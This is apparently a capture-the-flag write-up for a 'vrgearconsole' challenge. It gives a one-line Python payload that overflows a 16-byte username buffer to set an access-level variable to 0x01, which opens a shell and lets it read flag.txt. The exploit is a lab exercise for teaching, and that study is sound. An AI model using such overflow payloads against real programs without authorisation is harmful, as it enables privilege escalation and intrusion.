This problem can only be done through SSH, so no external script is necessary.

Enter the following in the given shell:

# The first command takes us to the problem.
cd /problems/b7d87de6335e37e49c9ea05875fd2db7

# This pipes exactly 16 bytes of useless input into the username buffer
# so that the accessLevel value can be modified through buffer overflow.
# accessLevel must be less than 0x30 for a shell, so we use 0x1.
(python -c 'print "\x90"*16 + "\x01\n"'; cat -) | ./vrgearconsole

# Now we will get a shell, though it is not distinguished by a $.
cat flag.txt
